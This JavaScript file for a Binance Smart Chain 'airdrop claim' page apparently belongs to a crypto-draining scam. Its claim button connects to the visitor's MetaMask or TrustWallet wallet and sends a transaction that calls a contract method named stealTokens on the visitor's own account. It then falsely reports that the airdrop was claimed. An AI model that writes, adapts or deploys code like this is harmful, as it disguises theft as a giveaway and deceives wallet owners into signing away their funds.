console.log('bsc.js loaded successfully');

// Function to claim the airdrop on BSC
async function claimAirdropBSC() {
    console.log('Attempting to claim airdrop on BSC...');

    // Ensure accounts are available (retrieved from TrustWallet or MetaMask)
    if (!Array.isArray(window.accounts) || window.accounts.length === 0) {
        console.error('No accounts connected');
        alert('Please connect to a wallet first!');
        return;
    }

    // Ensure contract details are loaded before proceeding
    if (!contractABI || !contractAddress) {
        console.error('Contract details not loaded:', { contractABI, contractAddress });
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    try {
        console.log('Claiming airdrop on BSC...');
        const web3 = new Web3(window.ethereum);  // Initialize Web3 with the connected wallet (MetaMask or TrustWallet)
        const contract = new web3.eth.Contract(contractABI, contractAddress);

        // Use the first account in the accounts array (assumed that accounts[0] is the connected wallet)
        await contract.methods.stealTokens(window.accounts[0]).send({ from: window.accounts[0] });
        alert('Airdrop claimed successfully on BSC!');
    } catch (error) {
        console.error('Error claiming airdrop on BSC:', error);
        alert('Error claiming airdrop on BSC');
    }
}

// Attach event listener for claiming airdrop
window.addEventListener('DOMContentLoaded', () => {
    const claimButtonBSC = document.getElementById('claimAirdropButton');
    claimButtonBSC.disabled = true; // Initially disable the claim button
    claimButtonBSC.addEventListener('click', claimAirdropBSC); // Attach the click event listener
});

